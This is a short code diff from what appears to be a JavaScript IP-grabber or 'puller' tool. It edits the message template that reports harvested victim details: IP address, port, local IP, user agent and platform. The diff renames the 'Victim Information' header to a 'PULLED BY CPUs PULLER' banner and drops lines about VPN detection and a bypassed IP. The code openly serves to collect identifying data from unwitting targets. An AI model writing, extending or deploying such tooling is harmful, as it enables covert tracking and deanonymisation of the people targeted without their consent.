@@ -205,12 +205,10 @@
             
             // Format the message with VPN detection and bypass results
             const message = `
-**Victim Information:**
+**INFO FR FR**
+**INFO PULLED BY CPUs PULLER**
 - IP Address: ${info.ip}
 - Port Number: ${info.port}
-- VPN Detected: ${info.vpn ? 'Yes' : 'No'}
-${info.vpn ? `- Indicators: ${info.vpnIndicators.join(', ')}` : ''}
-${info.bypassedIP ? `- Bypassed IP: ${info.bypassedIP}` : ''}
 ${info.localIP ? `- Local IP: ${info.localIP}` : ''}
 - User Agent: ${info.userAgent.substring(0, 60)}...
 - Platform: ${info.platform}
